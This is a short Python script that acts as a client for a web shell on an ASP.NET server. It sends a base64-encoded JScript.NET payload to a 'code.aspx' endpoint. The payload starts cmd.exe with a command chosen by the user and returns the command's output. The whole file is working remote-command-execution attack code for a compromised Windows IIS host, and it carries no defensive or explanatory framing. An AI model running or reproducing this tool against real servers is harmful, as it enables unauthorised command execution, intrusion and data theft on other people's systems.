import requests
import base64
import sys

# setup: pip install requests
# usage: this.py <command>
if __name__ == "__main__":
    payload = """var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item["z2"])); var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item["z1"])));var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write("->|"+out.ReadToEnd()+EI.ReadToEnd()+"|<-");"""
    post_dict = {"paz": payload, "z1": base64.b64encode("cmd".encode("ascii")).decode("ascii"), "z2": base64.b64encode(sys.argv[1].encode("ascii")).decode("ascii")}
    r = requests.post("http://127.0.0.1/code.aspx", data=post_dict)
    print(r.text)

